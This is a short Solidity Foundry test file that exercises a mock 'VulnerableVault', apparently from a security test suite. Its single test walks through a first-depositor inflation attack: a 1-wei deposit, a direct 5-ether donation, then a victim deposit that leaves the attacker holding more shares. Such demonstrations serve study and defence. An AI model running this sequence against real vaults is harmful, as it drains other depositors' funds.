// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import { Test } from "forge-std/Test.sol";
import { MockERC20 } from "../../../src/mocks/tokens/MockERC20.sol";
import { VulnerableVault } from "../../../src/mocks/vaults/vulnerable/VulnerableVault.sol";

contract VulnerableVaultTest is Test {
    MockERC20 asset;
    VulnerableVault vault;
    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        asset = new MockERC20();
        vault = new VulnerableVault(address(asset));
        asset.mint(attacker, 10 ether);
        asset.mint(victim, 10 ether);
        vm.prank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vm.prank(victim);
        asset.approve(address(vault), type(uint256).max);
    }

    function test_firstDepositorInflationAttack_drainsVictim() public {
        vm.prank(attacker);
        vault.deposit(1, attacker);

        vm.prank(attacker);
        asset.transfer(address(vault), 5 ether);

        vm.prank(victim);
        vault.deposit(5 ether, victim);

        assertGt(vault.balanceOf(attacker), vault.balanceOf(victim));
    }
}
